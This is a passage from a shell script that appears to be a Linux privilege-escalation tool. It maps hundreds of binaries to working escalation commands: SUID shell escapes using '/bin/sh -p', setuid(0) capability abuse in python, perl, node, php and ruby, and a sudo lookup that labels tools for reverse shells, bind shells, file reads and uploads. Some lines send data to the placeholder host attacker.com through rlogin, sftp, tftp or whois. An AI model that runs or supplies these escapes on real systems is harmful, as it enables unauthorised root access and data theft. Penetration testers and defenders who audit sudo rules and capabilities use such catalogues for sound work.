config set dbfilename output-file
set x "DATA"
save' ;;
    restic) echo 'RESTIC_PASSWORD_COMMAND='\''/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"'\'' restic backup' ;;
    rev) echo 'rev /path/to/input-file | rev' ;;
    rlogin) echo 'rlogin -l DATA -p 12345 attacker.com' ;;
    rlwrap) echo 'rlwrap /bin/sh -p' ;;
    rsync) echo 'rsync -e '\''/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"'\'' x:x' ;;
    rtorrent) echo 'echo '\''execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"'\'' >~/.rtorrent.rc
rtorrent' ;;
    run-parts) echo 'run-parts --new-session --regex '\''^sh$'\'' /bin --arg='\''-p'\''' ;;
    runscript) echo 'echo '\''! exec /bin/sh'\'' >/path/to/temp-file
runscript /path/to/temp-file' ;;
    sash) echo 'sash' ;;
    scanmem) echo 'scanmem
shell /bin/sh' ;;
    scp) echo 'echo '\''exec /bin/sh 0<&2 1>&2'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:' ;;
    script) echo 'script -q /dev/null' ;;
    scrot) echo 'scrot -e /bin/sh' ;;
    sed) echo 'sed -n '\''1e exec /bin/sh 1>&0'\'' /etc/hosts' ;;
    setarch) echo 'setarch -3 /bin/sh -p' ;;
    setcap) echo 'setcap cap_setuid+ep /path/to/command' ;;
    setfacl) echo 'setfacl -m u:$(id -un):rwx /path/to/input-file' ;;
    setlock) echo 'setlock - /bin/sh -p' ;;
    sftp) echo 'sftp user@attacker.com
!/bin/sh' ;;
    shred) echo 'shred -u /path/to/output-file' ;;
    shuf) echo 'shuf -z /path/to/input-file' ;;
    slsh) echo 'slsh -e '\''system("/bin/sh")'\''' ;;
    socat) echo 'socat - '\''exec:/bin/sh -p,pty,ctty,raw,echo=0'\''' ;;
    socket) echo 'socket -svp '\''/bin/sh -i'\'' 12345' ;;
    soelim) echo 'soelim /path/to/input-file' ;;
    softlimit) echo 'softlimit /bin/sh -p' ;;
    sort) echo 'sort -m /path/to/input-file' ;;
    split) echo 'split --filter='\''/bin/sh -i 0<&2 1>&2'\'' /etc/hosts' ;;
    sqlite3) echo 'sqlite3 /dev/null '\''.shell /bin/sh'\''' ;;
    ss) echo 'ss -a -F /path/to/input-file' ;;
    ssh) echo 'ssh localhost /bin/sh' ;;
    ssh-agent) echo 'ssh-agent /bin/sh -p' ;;
    ssh-keygen) echo 'ssh-keygen -D /path/to/lib.so' ;;
    ssh-keyscan) echo 'ssh-keyscan -f /path/to/input-file' ;;
    sshpass) echo 'sshpass /bin/sh -p' ;;
    start-stop-daemon) echo 'start-stop-daemon -S -x /bin/sh -- -p' ;;
    stdbuf) echo 'stdbuf -i0 /bin/sh -p' ;;
    strace) echo 'strace -o /dev/null /bin/sh -p' ;;
    strings) echo 'strings /path/to/input-file' ;;
    sysctl) echo 'sysctl '\''kernel.core_pattern=|/path/to/command'\''' ;;
    systemctl) echo 'echo '\''[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target'\'' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service' ;;
    tac) echo 'tac -s '\''RANDOM'\'' /path/to/input-file' ;;
    tail) echo 'tail -c+0 /path/to/input-file' ;;
    tar) echo 'tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' ;;
    task) echo 'task execute /bin/sh' ;;
    tasksh) echo 'tasksh
!/bin/sh' ;;
    tbl) echo 'tbl /path/to/input-file' ;;
    tclsh) echo 'tclsh' ;;
    tcpdump) echo 'tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user' ;;
    tcsh) echo 'tcsh -b' ;;
    tdbtool) echo 'tdbtool
! /bin/sh' ;;
    tee) echo 'echo DATA | tee /path/to/output-file' ;;
    telnet) echo 'telnet
!/bin/sh' ;;
    terraform) echo 'terraform console
file("/path/to/input-file")' ;;
    tex) echo 'tex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    tftp) echo 'tftp attacker.com
get /path/to/input-file' ;;
    tic) echo 'tic -C /path/to/input-file' ;;
    time) echo 'time /bin/sh -p' ;;
    timeout) echo 'timeout 0 /bin/sh -p' ;;
    tmate) echo 'tmate -c /bin/sh' ;;
    tmux) echo 'tmux -c /bin/sh' ;;
    troff) echo 'troff /path/to/input-file' ;;
    ul) echo 'ul /path/to/input-file' ;;
    unexpand) echo 'unexpand -t999 /path/to/input-file' ;;
    uniq) echo 'uniq /path/to/input-file' ;;
    unshare) echo 'unshare -r /bin/sh' ;;
    unsquashfs) echo 'unsquashfs shell
./squashfs-root/sh -p' ;;
    unzip) echo 'unzip -K shell.zip
./sh -p' ;;
    update-alternatives) echo 'echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0' ;;
    urlget) echo 'urlget - /path/to/input-file' ;;
    uuencode) echo 'uuencode /path/to/input-file /dev/stdout | uudecode' ;;
    varnishncsa) echo 'varnishncsa -g request -q '\''ReqURL ~ "/xxxxxxxxxx"'\'' -F '\''%{yyy}i'\'' -w /path/to/output-file' ;;
    vi) echo 'vi -c '\'':!/bin/sh'\'' /dev/null' ;;
    vigr) echo 'vigr' ;;
    vim) echo 'vim -c '\'':redir! >/path/to/output-file | echo "DATA" | redir END | q'\''' ;;
    vipw) echo 'vipw' ;;
    w3m) echo 'w3m -dump /path/to/input-file' ;;
    watch) echo 'watch -x /bin/sh -p -c '\''reset; exec /bin/sh -p 1>&0 2>&0'\''' ;;
    wc) echo 'wc --files0-from /path/to/input-file' ;;
    wget) echo 'echo -e '\''#!/bin/sh -p\\n/bin/sh -p 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0' ;;
    whiptail) echo 'whiptail --textbox --scrolltext /path/to/input-file 0 0' ;;
    whois) echo 'whois -h attacker.com -p 12345 x' ;;
    wish) echo 'wish' ;;
    xargs) echo 'xargs -a /dev/null /bin/sh -p' ;;
    xdotool) echo 'xdotool exec --sync /bin/sh -p' ;;
    xmodmap) echo 'xmodmap -v /path/to/input-file' ;;
    xmore) echo 'xmore /path/to/input-file' ;;
    xpad) echo 'xpad -f /path/to/input-file' ;;
    xxd) echo 'xxd /path/to/input-file | xxd -r' ;;
    xz) echo 'xz -c /path/to/input-file | xz -d' ;;
    yash) echo 'yash' ;;
    zic) echo 'echo '\''Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -'\'' >/path/to/temp-file
echo '\''Zone Test 2:00 Jordan CE%sT'\'' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file' ;;
    zip) echo 'zip /path/to/temp-file /etc/hosts -T -TT '\''/bin/sh #'\''' ;;
    zless) echo 'zless /path/to/input-file' ;;
    zsh) echo 'zsh' ;;
    zsoelim) echo 'zsoelim /path/to/input-file' ;;
  esac
}

# ========== CAPABILITIES LOOKUP ==========
is_cap_exploitable() {
  local b="$1"
  case "$b" in
    gzip) echo 'file-read|CAP_DAC_OVERRIDE'; return 0 ;;
    node) echo 'shell|CAP_SETUID'; return 0 ;;
    perl) echo 'shell|CAP_SETUID'; return 0 ;;
    php) echo 'shell,shell,shell,shell|CAP_SETUID;CAP_SETUID;CAP_SETUID;CAP_SETUID'; return 0 ;;
    python) echo 'library-load,shell|CAP_SETUID;CAP_SETUID'; return 0 ;;
    ruby) echo 'shell|CAP_SETUID'; return 0 ;;
    tclsh) echo 'library-load|'; return 0 ;;
    *) return 1 ;;
  esac
}

get_cap_exploit() {
  local b="$1"
  case "$b" in
    gzip) echo 'gzip -c /path/to/input-file | gzip -d' ;;
    node) echo 'node -e '\''process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'\''' ;;
    perl) echo 'perl -e '\''use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'\''' ;;
    php) echo 'php -r '\''posix_setuid(0); system("/bin/sh -i");'\''' ;;
    python) echo 'python -c '\''import os; os.setuid(0); os.execl("/bin/sh", "sh")'\''' ;;
    ruby) echo 'ruby -e '\''Process::Sys.setuid(0); exec "/bin/sh"'\''' ;;
    tclsh) echo 'tclsh
load /path/to/lib.so x' ;;
  esac
}

# ========== SUDO LOOKUP ==========
is_sudo_exploitable() {
  local b="$1"
  case "$b" in
    7z) echo 'file-read'; return 0 ;;
    R) echo 'shell'; return 0 ;;
    aa-exec) echo 'shell'; return 0 ;;
    ab) echo 'download,upload'; return 0 ;;
    acr) echo 'command'; return 0 ;;
    alpine) echo 'file-read'; return 0 ;;
    ansible-playbook) echo 'shell'; return 0 ;;
    ansible-test) echo 'shell'; return 0 ;;
    aoss) echo 'shell'; return 0 ;;
    apache2) echo 'file-read,file-read'; return 0 ;;
    apache2ctl) echo 'file-read'; return 0 ;;
    apt-get) echo 'inherit,shell,shell'; return 0 ;;
    aptitude) echo 'inherit'; return 0 ;;
    ar) echo 'file-read'; return 0 ;;
    arch-nspawn) echo 'shell'; return 0 ;;
    aria2c) echo 'command,command,download,file-read'; return 0 ;;
    arj) echo 'file-read,file-write'; return 0 ;;
    arp) echo 'file-read'; return 0 ;;
    as) echo 'file-read'; return 0 ;;
    ascii-xfr) echo 'file-read'; return 0 ;;
    ascii85) echo 'file-read'; return 0 ;;
    ash) echo 'file-write,shell'; return 0 ;;
    aspell) echo 'file-read,file-read'; return 0 ;;
    asterisk) echo 'shell'; return 0 ;;
    at) echo 'command,shell'; return 0 ;;
    atobm) echo 'file-read'; return 0 ;;
    autoconf) echo 'shell'; return 0 ;;
    autoheader) echo 'shell'; return 0 ;;
    autoreconf) echo 'shell'; return 0 ;;
    aws) echo 'file-read,inherit'; return 0 ;;
    base32) echo 'file-read'; return 0 ;;
    base58) echo 'file-read'; return 0 ;;
    base64) echo 'file-read'; return 0 ;;
    basenc) echo 'file-read'; return 0 ;;
    basez) echo 'file-read'; return 0 ;;
    bash) echo 'download,download,file-read,file-read,file-write,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    bashbug) echo 'inherit'; return 0 ;;
    batcat) echo 'inherit'; return 0 ;;
    bbot) echo 'file-read'; return 0 ;;
    bc) echo 'file-read'; return 0 ;;
    bconsole) echo 'file-read,shell'; return 0 ;;
    borg) echo 'shell'; return 0 ;;
    bpftrace) echo 'shell,shell,shell'; return 0 ;;
    bridge) echo 'file-read'; return 0 ;;
    bundle) echo 'inherit,inherit,shell,shell,shell'; return 0 ;;
    busctl) echo 'inherit,shell,shell'; return 0 ;;
    busybox) echo 'inherit,inherit,reverse-shell,upload'; return 0 ;;
    byebug) echo 'inherit'; return 0 ;;
    bzip2) echo 'file-read'; return 0 ;;
    cabal) echo 'shell'; return 0 ;;
    cancel) echo 'upload'; return 0 ;;
    capsh) echo 'shell'; return 0 ;;
    cargo) echo 'inherit'; return 0 ;;
    cat) echo 'file-read'; return 0 ;;
    cdist) echo 'shell'; return 0 ;;
    certbot) echo 'shell'; return 0 ;;
    chattr) echo 'privilege-escalation'; return 0 ;;
    check_by_ssh) echo 'shell'; return 0 ;;
    check_cups) echo 'file-read'; return 0 ;;
    check_log) echo 'file-read,file-write'; return 0 ;;
    check_memory) echo 'file-read'; return 0 ;;
    check_raid) echo 'file-read'; return 0 ;;
    check_ssl_cert) echo 'shell'; return 0 ;;
    check_statusfile) echo 'file-read'; return 0 ;;
    chmod) echo 'privilege-escalation'; return 0 ;;
    choom) echo 'shell'; return 0 ;;
    chown) echo 'privilege-escalation'; return 0 ;;
    chroot) echo 'shell'; return 0 ;;
    chrt) echo 'shell'; return 0 ;;
    clamscan) echo 'file-read'; return 0 ;;
    clisp) echo 'shell'; return 0 ;;
    cmake) echo 'file-read,shell'; return 0 ;;
    cmp) echo 'file-read'; return 0 ;;
    cobc) echo 'shell'; return 0 ;;
    code) echo 'download'; return 0 ;;
    codex) echo 'shell'; return 0 ;;
    column) echo 'file-read'; return 0 ;;
    comm) echo 'file-read'; return 0 ;;
    composer) echo 'shell'; return 0 ;;
    cowsay) echo 'inherit'; return 0 ;;
    cowthink) echo 'inherit'; return 0 ;;
    cp) echo 'file-read,file-write,privilege-escalation,privilege-escalation'; return 0 ;;
    cpio) echo 'file-read,file-read,file-write,shell'; return 0 ;;
    cpulimit) echo 'shell'; return 0 ;;
    crash) echo 'command,inherit'; return 0 ;;
    crontab) echo 'command,inherit'; return 0 ;;
    csh) echo 'file-write,shell'; return 0 ;;
    csplit) echo 'file-read,file-write'; return 0 ;;
    csvtool) echo 'file-read,file-write,shell'; return 0 ;;
    ctr) echo 'shell'; return 0 ;;
    cupsfilter) echo 'file-read'; return 0 ;;
    curl) echo 'download,file-read,file-write,library-load,upload,upload,upload'; return 0 ;;
    cut) echo 'file-read'; return 0 ;;
    dash) echo 'file-write,shell'; return 0 ;;
    date) echo 'file-read'; return 0 ;;
    dc) echo 'shell'; return 0 ;;
    dd) echo 'file-read,file-write'; return 0 ;;
    debugfs) echo 'shell'; return 0 ;;
    dhclient) echo 'shell'; return 0 ;;
    dialog) echo 'file-read'; return 0 ;;
    diff) echo 'file-read,file-read'; return 0 ;;
    dig) echo 'file-read'; return 0 ;;
    distcc) echo 'shell'; return 0 ;;
    dmesg) echo 'file-read,inherit'; return 0 ;;
    dmsetup) echo 'shell'; return 0 ;;
    dnf) echo 'command'; return 0 ;;
    dnsmasq) echo 'command'; return 0 ;;
    doas) echo 'shell'; return 0 ;;
    docker) echo 'file-read,file-write,shell,shell'; return 0 ;;
    dos2unix) echo 'file-read,file-write'; return 0 ;;
    dosbox) echo 'file-read,file-read,file-write'; return 0 ;;
    dotnet) echo 'file-read,shell'; return 0 ;;
    dpkg) echo 'inherit,shell'; return 0 ;;
    dstat) echo 'inherit'; return 0 ;;
    dvips) echo 'shell'; return 0 ;;
    easyrsa) echo 'shell'; return 0 ;;
    eb) echo 'inherit'; return 0 ;;
    ed) echo 'file-read,file-write,shell'; return 0 ;;
    efax) echo 'file-read'; return 0 ;;
    egrep) echo 'file-read'; return 0 ;;
    elvish) echo 'file-read,file-write,shell'; return 0 ;;
    emacs) echo 'file-read,file-write,shell'; return 0 ;;
    enscript) echo 'shell'; return 0 ;;
    env) echo 'shell'; return 0 ;;
    eqn) echo 'file-read'; return 0 ;;
    espeak) echo 'file-read'; return 0 ;;
    ex) echo 'inherit,shell'; return 0 ;;
    exiftool) echo 'file-read,file-write,file-write,file-write,file-write'; return 0 ;;
    expand) echo 'file-read'; return 0 ;;
    expect) echo 'file-read,shell'; return 0 ;;
    facter) echo 'inherit,inherit'; return 0 ;;
    fail2ban-client) echo 'command,command'; return 0 ;;
    fastfetch) echo 'command,file-read,shell'; return 0 ;;
    ffmpeg) echo 'library-load'; return 0 ;;
    fgrep) echo 'file-read'; return 0 ;;
    file) echo 'file-read,file-read'; return 0 ;;
    find) echo 'file-read,file-write,shell'; return 0 ;;
    finger) echo 'download,upload'; return 0 ;;
    firejail) echo 'shell'; return 0 ;;
    fish) echo 'shell'; return 0 ;;
    flock) echo 'shell'; return 0 ;;
    fmt) echo 'file-read,file-read'; return 0 ;;
    fold) echo 'file-read'; return 0 ;;
    forge) echo 'shell'; return 0 ;;
    fping) echo 'file-read'; return 0 ;;
    ftp) echo 'download,shell,upload'; return 0 ;;
    fzf) echo 'command,shell'; return 0 ;;
    gawk) echo 'bind-shell,file-read,file-write,reverse-shell,shell'; return 0 ;;
    gcc) echo 'file-read,file-read,file-write,shell'; return 0 ;;
    gcloud) echo 'inherit'; return 0 ;;
    gcore) echo 'file-read'; return 0 ;;
    gdb) echo 'file-write'; return 0 ;;
    gem) echo 'inherit,inherit,inherit,shell'; return 0 ;;
    genie) echo 'shell'; return 0 ;;
    genisoimage) echo 'file-read,file-read'; return 0 ;;
    getent) echo 'privilege-escalation'; return 0 ;;
    ghc) echo 'shell'; return 0 ;;
    ghci) echo 'shell'; return 0 ;;
    ginsh) echo 'shell'; return 0 ;;
    git) echo 'file-read,file-write,inherit,inherit,shell,shell,shell'; return 0 ;;
    gnuplot) echo 'shell'; return 0 ;;
    go) echo 'bind-shell,file-read,file-write,reverse-shell,shell'; return 0 ;;
    grc) echo 'shell'; return 0 ;;
    grep) echo 'file-read'; return 0 ;;
    gtester) echo 'file-write,shell'; return 0 ;;
    guile) echo 'shell'; return 0 ;;
    gzip) echo 'file-read'; return 0 ;;
    hashcat) echo 'file-write'; return 0 ;;
    head) echo 'file-read'; return 0 ;;
    hexdump) echo 'file-read'; return 0 ;;
    hg) echo 'shell'; return 0 ;;
    highlight) echo 'file-read'; return 0 ;;
    hping3) echo 'shell,upload'; return 0 ;;
    iconv) echo 'file-read,file-write'; return 0 ;;
    iftop) echo 'shell'; return 0 ;;
    install) echo 'privilege-escalation'; return 0 ;;
    ionice) echo 'shell'; return 0 ;;
    ip) echo 'file-read,shell,shell'; return 0 ;;
    iptables-save) echo 'file-write'; return 0 ;;
    ispell) echo 'shell'; return 0 ;;
    java) echo 'shell'; return 0 ;;
    jjs) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    joe) echo 'shell'; return 0 ;;
    join) echo 'file-read'; return 0 ;;
    journalctl) echo 'inherit'; return 0 ;;
    jq) echo 'file-read'; return 0 ;;
    jrunscript) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    jshell) echo 'file-read,file-write,shell'; return 0 ;;
    jtag) echo 'shell'; return 0 ;;
    julia) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    ksshell) echo 'file-read'; return 0 ;;
    ksu) echo 'shell'; return 0 ;;
    kubectl) echo 'shell,upload'; return 0 ;;
    last) echo 'file-read'; return 0 ;;
    latex) echo 'file-read,file-write,shell'; return 0 ;;
    latexmk) echo 'file-read'; return 0 ;;
    ld.so) echo 'shell'; return 0 ;;
    ldconfig) echo 'library-load'; return 0 ;;
    less) echo 'command,file-read,file-read,file-read,file-write,inherit,shell,shell,shell'; return 0 ;;
    lftp) echo 'shell'; return 0 ;;
    links) echo 'file-read'; return 0 ;;
    ln) echo 'privilege-escalation'; return 0 ;;
    loginctl) echo 'shell'; return 0 ;;
    logrotate) echo 'file-read,file-write,shell'; return 0 ;;
    logsave) echo 'shell'; return 0 ;;
    look) echo 'file-read'; return 0 ;;
    lp) echo 'upload'; return 0 ;;
    ltrace) echo 'file-read,file-write,shell'; return 0 ;;
    lua) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    lwp-download) echo 'download,file-read,file-write,file-write'; return 0 ;;
    lwp-request) echo 'file-read'; return 0 ;;
    lxd) echo 'shell,shell'; return 0 ;;
    m4) echo 'command,file-read,shell'; return 0 ;;
    mail) echo 'shell,shell'; return 0 ;;
    make) echo 'file-read,file-write,shell'; return 0 ;;
    man) echo 'file-read,inherit,shell'; return 0 ;;
    mawk) echo 'file-read,file-write,shell'; return 0 ;;
    minicom) echo 'shell,shell'; return 0 ;;
    more) echo 'file-read,shell'; return 0 ;;
    mosh-server) echo 'shell'; return 0 ;;
    mosquitto) echo 'file-read'; return 0 ;;
    mount) echo 'privilege-escalation'; return 0 ;;
    msfconsole) echo 'inherit'; return 0 ;;
    msgattrib) echo 'file-read'; return 0 ;;
    msgcat) echo 'file-read'; return 0 ;;
    msgconv) echo 'file-read'; return 0 ;;
    msgfilter) echo 'file-read,shell'; return 0 ;;
    msgmerge) echo 'file-read'; return 0 ;;
    msguniq) echo 'file-read'; return 0 ;;
    mtr) echo 'file-read'; return 0 ;;
    multitime) echo 'shell'; return 0 ;;
    mutt) echo 'file-read'; return 0 ;;
    mv) echo 'file-write,privilege-escalation'; return 0 ;;
    mypy) echo 'file-read,file-write'; return 0 ;;
    mysql) echo 'library-load,shell'; return 0 ;;
    nano) echo 'file-read,file-write,shell,shell'; return 0 ;;
    nasm) echo 'file-read'; return 0 ;;
    nc) echo 'bind-shell,download,download,reverse-shell,upload,upload'; return 0 ;;
    ncdu) echo 'shell'; return 0 ;;
    ncftp) echo 'shell'; return 0 ;;
    neofetch) echo 'file-read,shell'; return 0 ;;
    nft) echo 'file-read'; return 0 ;;
    nginx) echo 'download,library-load,upload'; return 0 ;;
    nice) echo 'shell'; return 0 ;;
    nl) echo 'file-read'; return 0 ;;
    nm) echo 'file-read'; return 0 ;;
    nmap) echo 'file-read,file-write'; return 0 ;;
    node) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    nohup) echo 'command,shell'; return 0 ;;
    npm) echo 'shell,shell,shell'; return 0 ;;
    nroff) echo 'file-read,shell'; return 0 ;;
    nsenter) echo 'shell'; return 0 ;;
    ntpdate) echo 'file-read'; return 0 ;;
    octave) echo 'file-read,file-write,shell'; return 0 ;;
    od) echo 'file-read'; return 0 ;;
    opencode) echo 'command'; return 0 ;;
    openssl) echo 'download,file-read,file-write,file-write,library-load,reverse-shell,upload'; return 0 ;;
    openvpn) echo 'file-read,shell'; return 0 ;;
    openvt) echo 'command'; return 0 ;;
    opkg) echo 'shell'; return 0 ;;
    pandoc) echo 'file-read,file-write'; return 0 ;;
    passwd) echo 'privilege-escalation'; return 0 ;;
    paste) echo 'file-read'; return 0 ;;
    pax) echo 'file-read'; return 0 ;;
    pdflatex) echo 'file-read,file-write,shell'; return 0 ;;
    pdftex) echo 'shell'; return 0 ;;
    perf) echo 'shell'; return 0 ;;
    perl) echo 'download,file-read,reverse-shell,shell,shell,upload'; return 0 ;;
    perlbug) echo 'shell'; return 0 ;;
    pexec) echo 'shell'; return 0 ;;
    pg) echo 'file-read,shell'; return 0 ;;
    php) echo 'command,command,command,download,file-read,file-write,reverse-shell,shell,shell,shell,shell,upload'; return 0 ;;
    pic) echo 'file-read,shell'; return 0 ;;
    pidstat) echo 'shell'; return 0 ;;
    pkexec) echo 'shell'; return 0 ;;
    pkg) echo 'command'; return 0 ;;
    plymouth) echo 'shell'; return 0 ;;
    podman) echo 'shell'; return 0 ;;
    posh) echo 'shell'; return 0 ;;
    pr) echo 'file-read'; return 0 ;;
    procmail) echo 'command'; return 0 ;;
    pry) echo 'inherit'; return 0 ;;
    psftp) echo 'shell'; return 0 ;;
    psql) echo 'inherit,shell'; return 0 ;;
    ptx) echo 'file-read'; return 0 ;;
    puppet) echo 'file-read,file-write,shell'; return 0 ;;
    pwsh) echo 'file-write,shell'; return 0 ;;
    pygmentize) echo 'file-read'; return 0 ;;
    pyright) echo 'file-read,file-read,file-read'; return 0 ;;
    python) echo 'download,file-read,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    qpdf) echo 'file-read'; return 0 ;;
    rake) echo 'file-read'; return 0 ;;
    ranger) echo 'shell'; return 0 ;;
    rc) echo 'shell'; return 0 ;;
    readelf) echo 'file-read'; return 0 ;;
    redcarpet) echo 'file-read'; return 0 ;;
    redis) echo 'file-write'; return 0 ;;
    restic) echo 'command,command,shell,shell,upload'; return 0 ;;
    rev) echo 'file-read'; return 0 ;;
    rlogin) echo 'upload'; return 0 ;;
    rlwrap) echo 'file-write,shell'; return 0 ;;
    rpm) echo 'command'; return 0 ;;
    rsync) echo 'shell'; return 0 ;;
    rsyslogd) echo 'command'; return 0 ;;
    rtorrent) echo 'shell'; return 0 ;;
    ruby) echo 'download,file-read,file-write,library-load,reverse-shell,shell,upload'; return 0 ;;
    run-mailcap) echo 'inherit,inherit'; return 0 ;;
    run-parts) echo 'shell,shell'; return 0 ;;
    runscript) echo 'shell'; return 0 ;;
    rustc) echo 'file-read,file-write,inherit'; return 0 ;;
    rustdoc) echo 'file-read,file-write'; return 0 ;;
    rustfmt) echo 'file-read'; return 0 ;;
    rustup) echo 'command,shell'; return 0 ;;
    sash) echo 'shell'; return 0 ;;
    scanmem) echo 'shell'; return 0 ;;
    scp) echo 'download,shell,shell,upload'; return 0 ;;
    screen) echo 'file-write,file-write,shell'; return 0 ;;
    script) echo 'file-write,shell'; return 0 ;;
    scrot) echo 'shell'; return 0 ;;
    sed) echo 'file-read,file-write,shell,shell'; return 0 ;;
    service) echo 'shell'; return 0 ;;
    setarch) echo 'shell'; return 0 ;;
    setcap) echo 'privilege-escalation'; return 0 ;;
    setfacl) echo 'privilege-escalation'; return 0 ;;
    setlock) echo 'shell'; return 0 ;;
    sftp) echo 'download,shell,upload'; return 0 ;;
    sg) echo 'shell'; return 0 ;;
    shred) echo 'file-write'; return 0 ;;
    shuf) echo 'file-read,file-write'; return 0 ;;
    slsh) echo 'shell'; return 0 ;;
    smbclient) echo 'download,shell,upload'; return 0 ;;
    snap) echo 'command'; return 0 ;;
    socat) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    socket) echo 'bind-shell,reverse-shell'; return 0 ;;
    soelim) echo 'file-read'; return 0 ;;
    softlimit) echo 'shell'; return 0 ;;
    sort) echo 'file-read,file-write'; return 0 ;;
    split) echo 'file-read,file-write,shell'; return 0 ;;
    sqlite3) echo 'file-read,file-write,shell'; return 0 ;;
    ss) echo 'file-read'; return 0 ;;
    ssh) echo 'download,file-read,shell,shell,shell,upload'; return 0 ;;
    ssh-agent) echo 'shell'; return 0 ;;
    ssh-copy-id) echo 'file-read,file-write'; return 0 ;;
    ssh-keygen) echo 'library-load'; return 0 ;;
    ssh-keyscan) echo 'file-read'; return 0 ;;
    sshfs) echo 'command,shell'; return 0 ;;
    sshpass) echo 'shell'; return 0 ;;
    sshuttle) echo 'shell'; return 0 ;;
    start-stop-daemon) echo 'shell'; return 0 ;;
    stdbuf) echo 'shell'; return 0 ;;
    strace) echo 'file-write,shell'; return 0 ;;
    strings) echo 'file-read'; return 0 ;;
    su) echo 'shell'; return 0 ;;
    sudo) echo 'shell'; return 0 ;;
    sysctl) echo 'command,file-read'; return 0 ;;
    systemctl) echo 'inherit,shell,shell'; return 0 ;;
    systemd-resolve) echo 'inherit'; return 0 ;;
    systemd-run) echo 'command,shell,shell'; return 0 ;;
    tac) echo 'file-read'; return 0 ;;
    tail) echo 'file-read'; return 0 ;;
    tailscale) echo 'upload'; return 0 ;;
    tar) echo 'download,file-read,file-write,shell,shell,shell,upload'; return 0 ;;
    task) echo 'shell'; return 0 ;;
    taskset) echo 'shell'; return 0 ;;
    tasksh) echo 'shell'; return 0 ;;
    tbl) echo 'file-read'; return 0 ;;
    tclsh) echo 'library-load,reverse-shell,shell'; return 0 ;;
    tcpdump) echo 'command,command,file-write'; return 0 ;;
    tcsh) echo 'file-write,shell'; return 0 ;;
    tdbtool) echo 'shell'; return 0 ;;
    tee) echo 'file-write'; return 0 ;;
    telnet) echo 'reverse-shell,shell'; return 0 ;;
    terraform) echo 'file-read'; return 0 ;;
    tex) echo 'shell'; return 0 ;;
    tftp) echo 'download,upload'; return 0 ;;
    tic) echo 'file-read'; return 0 ;;
    time) echo 'shell'; return 0 ;;
    timedatectl) echo 'inherit'; return 0 ;;
    timeout) echo 'shell'; return 0 ;;
    tmate) echo 'shell'; return 0 ;;
    tmux) echo 'file-read,shell,shell'; return 0 ;;
    top) echo 'shell'; return 0 ;;
    torify) echo 'shell'; return 0 ;;
    torsocks) echo 'shell'; return 0 ;;
    troff) echo 'file-read'; return 0 ;;
    tsc) echo 'file-read,file-write'; return 0 ;;
    ul) echo 'file-read'; return 0 ;;
    unexpand) echo 'file-read'; return 0 ;;
    uniq) echo 'file-read'; return 0 ;;
    unshare) echo 'shell'; return 0 ;;
    unsquashfs) echo 'privilege-escalation'; return 0 ;;
    unzip) echo 'privilege-escalation'; return 0 ;;
    update-alternatives) echo 'file-write'; return 0 ;;
    urlget) echo 'file-read'; return 0 ;;
    uuencode) echo 'file-read'; return 0 ;;
    uv) echo 'shell'; return 0 ;;
    valgrind) echo 'shell'; return 0 ;;
    varnishncsa) echo 'file-write'; return 0 ;;
    vi) echo 'file-read,file-write,shell,shell,shell,shell'; return 0 ;;
    vigr) echo 'inherit'; return 0 ;;
    vim) echo 'file-read'; return 0 ;;
    vipw) echo 'inherit'; return 0 ;;
    virsh) echo 'command,file-write,file-write'; return 0 ;;
    w3m) echo 'file-read'; return 0 ;;
    wall) echo 'file-read'; return 0 ;;
    watch) echo 'shell,shell'; return 0 ;;
    wc) echo 'file-read'; return 0 ;;
    wg-quick) echo 'shell'; return 0 ;;
    wget) echo 'download,file-read,file-write,shell,upload,upload'; return 0 ;;
    whiptail) echo 'file-read'; return 0 ;;
    whois) echo 'download,upload'; return 0 ;;
    wish) echo 'inherit'; return 0 ;;
    xargs) echo 'file-read,shell,shell,shell'; return 0 ;;
    xdg-user-dir) echo 'shell'; return 0 ;;
    xdotool) echo 'shell'; return 0 ;;
    xmodmap) echo 'file-read'; return 0 ;;
    xmore) echo 'file-read'; return 0 ;;
    xpad) echo 'file-read'; return 0 ;;
    xxd) echo 'file-read,file-write'; return 0 ;;
    xz) echo 'file-read'; return 0 ;;
    yarn) echo 'shell,shell,shell'; return 0 ;;
    yash) echo 'shell'; return 0 ;;
    yelp) echo 'file-read'; return 0 ;;
    yt-dlp) echo 'shell'; return 0 ;;
    yum) echo 'command,download'; return 0 ;;
    zathura) echo 'shell'; return 0 ;;
    zcat) echo 'file-read'; return 0 ;;
    zgrep) echo 'file-read'; return 0 ;;
    zic) echo 'command'; return 0 ;;
    zip) echo 'file-read,shell'; return 0 ;;
    zless) echo 'inherit'; return 0 ;;
    zsh) echo 'download,file-read,file-read,file-write,inherit,reverse-shell,shell,upload'; return 0 ;;
    zsoelim) echo 'file-read'; return 0 ;;
    zypper) echo 'shell,shell'; return 0 ;;
    *) return 1 ;;
  esac
}

get_sudo_exploit() {
  local b="$1"
  case "$b" in
    7z) echo '7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so' ;;
    R) echo 'R --no-save -e '\''system("/bin/sh")'\''' ;;
